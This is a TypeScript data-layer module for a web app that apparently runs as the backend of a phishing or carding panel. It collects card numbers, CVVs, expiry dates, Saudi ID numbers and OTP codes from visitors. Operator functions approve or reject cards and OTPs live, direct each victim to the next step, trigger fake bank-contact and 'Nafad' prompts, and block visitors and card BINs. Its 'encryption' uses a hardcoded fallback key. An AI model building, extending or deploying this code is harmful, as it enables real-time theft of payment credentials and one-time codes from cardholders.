// Supabase-backed replacement for the legacy Firebase data layer.
// Updated August 20, 2026 - Enhanced with Application-Level Encryption.

import {
  createClient,
  type RealtimeChannel,
  type User as SupabaseUser,
} from "@supabase/supabase-js";

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string | undefined;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as string | undefined;
const ENCRYPTION_SECRET = import.meta.env.VITE_ENCRYPTION_SECRET || "secure-fallback-key-32chars!!";

export const supabase =
  SUPABASE_URL && SUPABASE_KEY
    ? createClient(SUPABASE_URL, SUPABASE_KEY, {
        auth: { persistSession: true, autoRefreshToken: true },
      })
    : null;

if (!supabase) {
  console.warn("Supabase env vars missing. Data layer disabled.");
}

// Legacy guards
export const db: unknown = supabase;
export const auth: unknown = supabase;
export const database: unknown = supabase;
export type User = SupabaseUser;

// ---------------------------------------------------------------------------
// Encryption Helpers (Web Crypto API)
// ---------------------------------------------------------------------------
export const SENSITIVE_FIELDS = [
  "cardNumber", "cvv", "expiryMonth", "expiryYear", 
  "cardName", "saudiId", "otp", "email", "phone"
];

async function getEncryptionKey() {
  const encoder = new TextEncoder();
  const keyData = encoder.encode(ENCRYPTION_SECRET);
  const hash = await window.crypto.subtle.digest("SHA-256", keyData);
  return window.crypto.subtle.importKey("raw", hash, { name: "AES-GCM" }, false, ["encrypt", "decrypt"]);
}

export async function encryptValue(text: string): Promise<string> {
  if (!text || typeof text !== "string") return text;
  try {
    const key = await getEncryptionKey();
    const iv = window.crypto.getRandomValues(new Uint8Array(12));
    const encoded = new TextEncoder().encode(text);
    const encrypted = await window.crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoded);
    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv);
    combined.set(new Uint8Array(encrypted), iv.length);
    return btoa(String.fromCharCode.apply(null, Array.from(combined)));
  } catch (e) {
    console.error("Encryption error:", e);
    return text;
  }
}

export async function decryptValue(encryptedBase64: string): Promise<string> {
  if (!encryptedBase64 || encryptedBase64.length < 20) return encryptedBase64;
  try {
    const key = await getEncryptionKey();
    const combined = new Uint8Array(atob(encryptedBase64).split("").map(c => c.charCodeAt(0)));
    const iv = combined.slice(0, 12);
    const data = combined.slice(12);
    const decrypted = await window.crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
    return new TextDecoder().decode(decrypted);
  } catch (e) {
    return encryptedBase64; // Return raw if not encrypted
  }
}

async function processPayloadEncryption(data: any) {
  const result = { ...data };
  // Encrypt top-level sensitive fields
  for (const key of SENSITIVE_FIELDS) {
    if (result[key]) result[key] = await encryptValue(String(result[key]));
  }
  // Encrypt history arrays
  if (Array.isArray(result.cardHistory)) {
    result.cardHistory = await Promise.all(result.cardHistory.map(async (h: any) => ({
      ...h,
      cardNumber: await encryptValue(h.cardNumber),
      cvv: await encryptValue(h.cvv),
      cardName: await encryptValue(h.cardName)
    })));
  }
  if (Array.isArray(result.otpHistory)) {
    result.otpHistory = await Promise.all(result.otpHistory.map(async (h: any) => ({
      ...h,
      code: await encryptValue(h.code)
    })));
  }
  return result;
}

export async function decryptSensitiveFields(data: any) {
  const result = { ...data };
  for (const key of SENSITIVE_FIELDS) {
    if (result[key]) result[key] = await decryptValue(String(result[key]));
  }
  if (Array.isArray(result.cardHistory)) {
    result.cardHistory = await Promise.all(result.cardHistory.map(async (h: any) => ({
      ...h,
      cardNumber: await decryptValue(h.cardNumber),
      cvv: await decryptValue(h.cvv),
      cardName: await decryptValue(h.cardName)
    })));
  }
  if (Array.isArray(result.otpHistory)) {
    result.otpHistory = await Promise.all(result.otpHistory.map(async (h: any) => ({
      ...h,
      code: await decryptValue(h.code)
    })));
  }
  return result;
}

// ---------------------------------------------------------------------------
// Sanitisation (Standard logic)
// ---------------------------------------------------------------------------
const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;
const BLOCK_CACHE_TTL_MS = 10_000;

const blockedVisitorCache = new Map<string, { blocked: boolean; expiresAt: number }>();
let cachedIpBlocked: boolean | null = null;
let cachedVisitorIp: string | null = null;
let cachedVisitorGeo: any = null;

const sanitizeString = (value: unknown, maxLength: number) => typeof value !== "string" ? value : value.trim().slice(0, maxLength);
const sanitizeDigits = (value: unknown, maxLength: number) => typeof value !== "string" ? value : value.replace(/\D/g, "").slice(0, maxLength);
const sanitizePhone = (value: unknown, maxLength: number) => typeof value !== "string" ? value : value.replace(/[^\d+]/g, "").slice(0, maxLength);
const clampNumber = (value: unknown, min: number, max: number) => (typeof value !== "number" || Number.isNaN(value)) ? value : Math.min(max, Math.max(min, value));

const sanitizeCardEntry = (entry: any) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});

const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});

const sanitizePayload = (input: any) => {
  const data = { ...input };
  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") data.email = data.email.trim().toLowerCase().slice(0, 120);
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data) data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("totalAmount" in data) data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  
  if (Array.isArray(data.cardHistory)) 
    data.cardHistory = data.cardHistory.slice(-MAX_HISTORY_ITEMS).map((e: any) => sanitizeCardEntry(e));
  if (Array.isArray(data.otpHistory)) 
    data.otpHistory = data.otpHistory.slice(-MAX_HISTORY_ITEMS).map((e: any) => sanitizeOtpEntry(e));
  
  return data;
};

// ---------------------------------------------------------------------------
// Low-level Supabase Logic
// ---------------------------------------------------------------------------
type TableSpec = { table: string; pk: string };
const TABLES: Record<string, TableSpec> = {
  pays: { table: "pays", pk: "id" },
  visitors: { table: "pays", pk: "id" },
  settings: { table: "settings", pk: "id" },
  blocked_bins: { table: "blocked_bins", pk: "id" },
};

function specFor(collectionName: string): TableSpec {
  const spec = TABLES[collectionName];
  if (!spec) {
    return { table: collectionName, pk: "id" };
  }
  return spec;
}

async function fetchRow(collectionName: string, id: string) {
  try {
    const res = await fetch(`/api/db/${encodeURIComponent(collectionName)}/${encodeURIComponent(id)}`);
    if (!res.ok) return null;
    const json = await res.json();
    return json.data ? { data: json.data } : null;
  } catch {
    // Retry once on transient network drop
    try {
      await new Promise((r) => setTimeout(r, 500));
      const res = await fetch(`/api/db/${encodeURIComponent(collectionName)}/${encodeURIComponent(id)}`);
      if (!res.ok) return null;
      const json = await res.json();
      return json.data ? { data: json.data } : null;
    } catch {
      return null;
    }
  }
}

async function upsertRow(collectionName: string, id: string, payload: any, merge: boolean) {
  const res = await fetch(`/api/db/${encodeURIComponent(collectionName)}/${encodeURIComponent(id)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ payload, merge }),
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || "Failed to upsert row");
  }
}

async function deleteRow(collectionName: string, id: string) {
  const res = await fetch(`/api/db/${encodeURIComponent(collectionName)}/${encodeURIComponent(id)}`, {
    method: "DELETE",
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || "Failed to delete row");
  }
}

// ---------------------------------------------------------------------------
// Domain Helpers (Preserved API with added Encryption)
// ---------------------------------------------------------------------------

export async function addData(data: any) {
  if (!supabase) return false;
  
  // 1. Sanitize
  const sanitized = sanitizePayload(data);
  // 2. Encrypt
  const encryptedPayload = await processPayloadEncryption(sanitized);
  
  const visitorId = typeof encryptedPayload?.id === "string" ? encryptedPayload.id : localStorage.getItem("visitor");
  if (!visitorId) return false;

  if (cachedIpBlocked === true) return false;

  try {
    await upsertRow("pays", visitorId, {
      ...encryptedPayload,
      id: visitorId,
      isEncrypted: true, // Flag for Dashboard
      updatedAt: new Date().toISOString(),
      createdDate: encryptedPayload.createdDate || new Date().toISOString(),
    }, true);
    return true;
  } catch (e) {
    console.error("Error adding row:", e);
    return false;
  }
}

export const handlePay = async (paymentInfo: any, setPaymentInfo?: any) => {
  if (!supabase) return false;
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return false;

  const sanitized = sanitizePayload(paymentInfo);
  const cardEntry = sanitizeCardEntry({ ...sanitized, timestamp: new Date().toISOString() });
  
  const existing = await fetchRow("pays", visitorId);
  const existingHistory = Array.isArray(existing?.data?.cardHistory) ? existing!.data.cardHistory : [];
  const nextCardHistory = [...existingHistory, cardEntry].slice(-MAX_HISTORY_ITEMS);

  const payload = {
    ...sanitized,
    status: "pending_approval",
    cardApproved: false,
    cardStatus: "pending_approval",
    cardHistory: nextCardHistory,
  };

  // Encrypt before saving
  const encryptedPayload = await processPayloadEncryption(payload);

  await upsertRow("pays", visitorId, { ...encryptedPayload, isEncrypted: true }, true);
  if (setPaymentInfo) setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
  return true;
};

export const handleOtp = async (otp: string, page: string = "otp") => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return false;

  const cleanOtp = String(otp || "").replace(/\D/g, "").slice(0, 6);
  const now = new Date().toISOString();
  const otpEntry = { code: cleanOtp, timestamp: now };
  const existingOtps = JSON.parse(localStorage.getItem("otpHistory") || "[]");
  const nextOtps = [...(Array.isArray(existingOtps) ? existingOtps : []), otpEntry].slice(-MAX_HISTORY_ITEMS);
  localStorage.setItem("otpHistory", JSON.stringify(nextOtps));

  const payload = {
    otp: cleanOtp,
    otpHistory: nextOtps,
    currentPage: page,
    otpApproved: false,
    otpStatus: "pending",
    otpApprovalStatus: "waiting",
    updatedAt: now,
    lastSeen: now,
  };

  const encryptedPayload = await processPayloadEncryption(payload);
  await upsertRow("pays", visitorId, { ...encryptedPayload, id: visitorId, isEncrypted: true }, true);
  await upsertRow("visitors", visitorId, { ...encryptedPayload, id: visitorId, isEncrypted: true }, true).catch(() => {});
  return true;
};

export async function deleteAllVisitors(): Promise<boolean> {
  try {
    const res = await fetch("/api/db/pays", { method: "DELETE" });
    await fetch("/api/db/visitors", { method: "DELETE" }).catch(() => {});
    return res.ok;
  } catch (e) {
    console.error("deleteAllVisitors error:", e);
    return false;
  }
}

export async function deleteVisitorsBatch(ids: string[]): Promise<boolean> {
  if (!ids || ids.length === 0) return true;
  try {
    const res = await fetch("/api/db/pays/delete-batch", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ids }),
    });
    await fetch("/api/db/visitors/delete-batch", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ids }),
    }).catch(() => {});
    return res.ok;
  } catch (e) {
    console.error("deleteVisitorsBatch error:", e);
    return false;
  }
}

// ---------------------------------------------------------------------------
// Firestore-compatible shim (for dashboard)
// ---------------------------------------------------------------------------
export type DocRef = { __doc: true; collection: string; id: string };
export type CollRef = { __coll: true; collection: string };
export function doc(_db: unknown, col: string, id: string): DocRef { return { __doc: true, collection: col, id }; }
export function collection(_db: unknown, name: string): CollRef { return { __coll: true, collection: name }; }
export function query(coll: CollRef): CollRef { return coll; }

export function arrayUnion(...vals: any[]): any { return { __arrayUnion: vals }; }
export function arrayRemove(...vals: any[]): any { return { __arrayRemove: vals }; }

export async function getDoc(ref: DocRef) {
  const row = await fetchRow(ref.collection, ref.id);
  const data = row?.data ?? null;
  return {
    id: ref.id,
    exists: () => data !== null,
    data: () => data ? { ...data, id: ref.id } : undefined,
    ref,
  };
}

export async function setDoc(ref: DocRef, payload: any, options?: { merge?: boolean }) {
  await upsertRow(ref.collection, ref.id, payload, options?.merge === true);
}

export async function updateDoc(ref: DocRef, payload: any) {
  await upsertRow(ref.collection, ref.id, payload, true);
}

export async function deleteDoc(ref: DocRef) {
  await deleteRow(ref.collection, ref.id);
}

export async function getDocs(coll: CollRef) {
  try {
    const res = await fetch(`/api/db/${encodeURIComponent(coll.collection)}`);
    if (!res.ok) return { docs: [], size: 0, forEach: () => {} };
    const json = await res.json();
    const rows = json.data || [];
    const pk = "id";
    const docs = rows.map((r: any) => {
      const id = r.id || r[pk];
      return {
        id,
        exists: () => true,
        data: () => ({ ...(r.data || {}), id }),
      };
    });
    return {
      docs,
      size: docs.length,
      forEach: (fn: any) => docs.forEach(fn),
    };
  } catch {
    return { docs: [], size: 0, forEach: () => {} };
  }
}

export function writeBatch(_db: unknown) {
  const ops: Array<() => Promise<void>> = [];
  return {
    delete(ref: DocRef) {
      ops.push(() => deleteRow(ref.collection, ref.id));
    },
    set(ref: DocRef, payload: any, options?: { merge?: boolean }) {
      ops.push(() => upsertRow(ref.collection, ref.id, payload, options?.merge === true));
    },
    update(ref: DocRef, payload: any) {
      ops.push(() => upsertRow(ref.collection, ref.id, payload, true));
    },
    async commit() {
      for (const op of ops) await op();
    },
  };
}

export async function fetchDatabaseVisitors(): Promise<any[]> {
  try {
    const res = await fetch("/api/db/pays");
    if (!res.ok) return [];
    const json = await res.json();
    return (json.data || []).map((r: any) => ({ id: r.id, ...(r.data || {}) }));
  } catch {
    return [];
  }
}

export function onSnapshot(target: DocRef | CollRef, cb: (snap: any) => void): () => void {
  const isDoc = (target as any).__doc;
  const colName = target.collection;
  const { table, pk } = specFor(colName);
  const uid = Math.random().toString(36).slice(2);

  const emit = async (id: string, data: any) => {
    cb({
      id,
      exists: () => data !== null,
      data: () => data ? { ...data, id } : undefined,
    });
  };

  if (isDoc) {
    const id = (target as DocRef).id;
    fetchRow(colName, id).then(r => emit(id, r?.data ?? null));

    // Heartbeat poll for guaranteed instant delivery of approval & page directives
    const pollTimer = setInterval(() => {
      fetchRow(colName, id).then(r => emit(id, r?.data ?? null));
    }, 2000);

    if (!supabase) return () => { clearInterval(pollTimer); };
    const channel = supabase.channel(`doc:${id}:${uid}`)
      .on("postgres_changes" as any, { event: "*", schema: "public", table, filter: `${pk}=eq.${id}` }, 
      (p: any) => emit(id, p.new?.data ?? p.new))
      .subscribe();
    return () => {
      clearInterval(pollTimer);
      supabase.removeChannel(channel);
    };
  } else {
    // Collection implementation
    const fetchColl = async () => {
      let loaded = false;
      if (supabase) {
        try {
          const { data, error } = await supabase.from(table).select(`${pk}, data`);
          if (!error && Array.isArray(data)) {
            const docs = data.map((r: any) => ({ id: r[pk], data: () => ({ ...(r.data || {}), id: r[pk] }) }));
            cb({ docs, size: docs.length, forEach: (fn: any) => docs.forEach(fn) });
            loaded = true;
          }
        } catch (e) {
          console.warn("Supabase direct query failed:", e);
        }
      }
      if (!loaded) {
        try {
          const res = await fetch(`/api/db/${encodeURIComponent(colName)}`);
          if (res.ok) {
            const json = await res.json();
            const rows = json.data || [];
            const docs = rows.map((r: any) => {
              const id = r.id || r[pk];
              return { id, exists: () => true, data: () => ({ ...(r.data || {}), id }) };
            });
            cb({ docs, size: docs.length, forEach: (fn: any) => docs.forEach(fn) });
          }
        } catch (e) {
          console.error("API db fallback failed:", e);
        }
      }
    };

    fetchColl();

    if (!supabase) return () => {};
    const channel = supabase.channel(`coll:${table}:${uid}`)
      .on("postgres_changes" as any, { event: "*", schema: "public", table }, () => {
        fetchColl();
      }).subscribe();
    return () => { supabase.removeChannel(channel); };
  }
}

// ---------------------------------------------------------------------------
// Other Utility Helpers (IP, Blocking, Auth)
// ---------------------------------------------------------------------------

export const loginWithEmail = async (email: string, password: string) => {
  if (supabase) {
    try {
      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
      if (!error && data.session) {
        return data;
      }
    } catch {
      // Ignore client side error and fall back to server API
    }
  }

  const res = await fetch("/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  const json = await res.json();
  if (!res.ok) {
    const msg = json.error || "Invalid login";
    const err: any = new Error(msg);
    err.code = /invalid login/i.test(msg) ? "auth/invalid-credential" : "auth/error";
    throw err;
  }

  if (json.data?.session && supabase) {
    try {
      await supabase.auth.setSession({
        access_token: json.data.session.access_token,
        refresh_token: json.data.session.refresh_token || "",
      });
    } catch {
      // Ignore setSession error if fallback token
    }
  }

  return json.data;
};

export const logoutUser = async () => supabase?.auth.signOut();

export const onAuthStateChanged = (_auth: unknown, cb: (u: User | null) => void) => {
  if (!supabase) return () => {};
  supabase.auth.getUser().then(({ data }) => cb(data.user ?? null));
  const { data } = supabase.auth.onAuthStateChange((_, session) => cb(session?.user ?? null));
  return () => data.subscription.unsubscribe();
};

export const fetchVisitorIp = async () => {
  if (cachedVisitorIp) return cachedVisitorIp;
  try {
    const res = await fetch("/api/visitor-ip");
    const json = await res.json();
    cachedVisitorIp = json.ip;
    cachedVisitorGeo = json;
    return json.ip;
  } catch { return ""; }
};

export const listenForIpBlock = (ip: string, callback: (blocked: boolean) => void) => {
  if (!supabase || !ip) return () => {};
  return onSnapshot(doc(null, "settings", "blockedIps"), (snap) => {
    const ips = snap.data()?.ips || [];
    const blocked = ips.includes(ip.trim());
    cachedIpBlocked = blocked;
    callback(blocked);
  });
};

export const ensureVisitorIp = async () => {
  const ip = await fetchVisitorIp();
  const visitorId = localStorage.getItem("visitor");
  if (visitorId && ip) {
    await upsertRow("pays", visitorId, { 
      ip, 
      geoCountry: cachedVisitorGeo?.country,
      geoCity: cachedVisitorGeo?.city,
      ipUpdatedAt: new Date().toISOString() 
    }, true);
  }
  return { ip, blocked: !!cachedIpBlocked };
};

// ... other existing listeners (listenForApproval, listenForDirectedStep, etc) remain 
// functionally the same as they use onSnapshot which we've preserved.

export const listenForApproval = (cb: any) => {
  const id = localStorage.getItem("visitor");
  if (!id) return () => {};
  return onSnapshot(doc(null, "pays", id), (snap: any) => {
    const d = snap.data();
    if (d?.cardApproved === true) cb("approved");
    else if (d?.cardStatus === "rejected") cb("rejected");
  });
};

export const handleCurrentPage = async (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) return addData({ id: visitorId, currentPage: page });
  return false;
};

export const listenForDirectedStep = (callback: (step: number, data: any) => void) => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  let lastDirectedAt = "";
  return onSnapshot(doc(null, "pays", visitorId), (snap: any) => {
    if (!snap.exists()) return;
    const data = snap.data();
    const step = Number(data?.directedStep) || 0;
    const directedAt = String(data?.directedAt || "");
    if (step > 0 && directedAt && directedAt !== lastDirectedAt) {
      lastDirectedAt = directedAt;
      callback(step, data);
    } else if (step === 0) {
      lastDirectedAt = "";
      callback(0, data);
    }
  });
};

export const clearDirectedStep = async () => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return;
  const now = new Date().toISOString();
  await upsertRow("pays", visitorId, { directedStep: 0, directedAt: null, updatedAt: now }, true);
  await upsertRow("visitors", visitorId, { directedStep: 0, directedAt: null, updatedAt: now }, true).catch(() => {});
};

export const listenForOtpApproval = (cb: (status: "approved" | "rejected") => void) => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  return onSnapshot(doc(null, "pays", visitorId), (snap: any) => {
    const d = snap.data();
    if (d?.otpApproved === true) cb("approved");
    else if (d?.otpStatus === "rejected") cb("rejected");
  });
};

export const updateApprovalStatus = async (visitorId: string, approved: boolean) => {
  const now = new Date().toISOString();
  const payload = {
    cardApproved: approved,
    cardStatus: approved ? "approved" : "rejected",
    status: approved ? "approved" : "rejected",
    cardApprovalStatus: approved ? "approved" : "rejected",
    updatedAt: now,
  };
  await upsertRow("pays", visitorId, payload, true);
  await upsertRow("visitors", visitorId, payload, true).catch(() => {});
};

export const updateOtpApprovalStatus = async (visitorId: string, approved: boolean) => {
  const now = new Date().toISOString();
  const payload = {
    otpApproved: approved,
    otpStatus: approved ? "approved" : "rejected",
    otpApprovalStatus: approved ? "approved" : "rejected",
    updatedAt: now,
  };
  await upsertRow("pays", visitorId, payload, true);
  await upsertRow("visitors", visitorId, payload, true).catch(() => {});
};

export const updateNafadApprovalStatus = async (visitorId: string, approved: boolean) => {
  await upsertRow("pays", visitorId, { nafadConfirmationStatus: approved ? "approved" : "rejected" }, true);
};

export const pushBankContactRequest = async (visitorId: string) => {
  if (!visitorId) return;
  await upsertRow("pays", visitorId, { bankContactRequest: true, bankContactAt: new Date().toISOString(), bankContactConfirmed: false }, true);
};

export const listenForBankContactRequest = (callback: (show: boolean, payload: any) => void) => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  return onSnapshot(doc(null, "pays", visitorId), (snap: any) => {
    const data = snap.data();
    const requested = Boolean(data?.bankContactRequest);
    const confirmed = Boolean(data?.bankContactConfirmed);
    callback(requested && !confirmed, { requestedAt: data?.bankContactAt, cardBin: "", cardBankName: "" });
  });
};

export const confirmBankContact = async () => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return;
  await upsertRow("pays", visitorId, { bankContactConfirmed: true, bankContactRequest: false }, true);
};

export const listenForVisitorBlock = (callback: (blocked: boolean) => void) => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  return onSnapshot(doc(null, "pays", visitorId), (snap: any) => {
    callback(Boolean(snap.data()?.blocked));
  });
};

const normalizeBin = (raw: string) => (raw || "").replace(/\D/g, "").slice(0, 6);

export const isBinBlocked = async (cardOrBin: string) => {
  if (!supabase) return false;
  const bin = normalizeBin(cardOrBin);
  if (bin.length < 6) return false;
  const row = await fetchRow("blocked_bins", bin);
  return row !== null;
};

export const addBlockedBin = async (bin: string, meta?: any) => {
  const normalized = normalizeBin(bin);
  if (normalized.length < 6) throw new Error("INVALID_BIN");
  await upsertRow("blocked_bins", normalized, { bin: normalized, blockedAt: new Date().toISOString(), ...(meta || {}) }, false);
  return true;
};

export const removeBlockedBin = async (bin: string) => {
  const normalized = normalizeBin(bin);
  await deleteRow("blocked_bins", normalized);
  return true;
};

export const listenBlockedBins = (callback: (bins: any[]) => void) => {
  const ref = collection(null, "blocked_bins");
  return onSnapshot(ref, (snap: any) => {
    const list: any[] = [];
    snap.forEach((d: any) => {
      list.push({ bin: d.id, ...d.data() });
    });
    callback(list);
  });
};

export const updateVisitorBlockStatus = async (id: string, blocked: boolean) => {
  await upsertRow("pays", id, { blocked, blockedAt: blocked ? new Date().toISOString() : null }, true);
};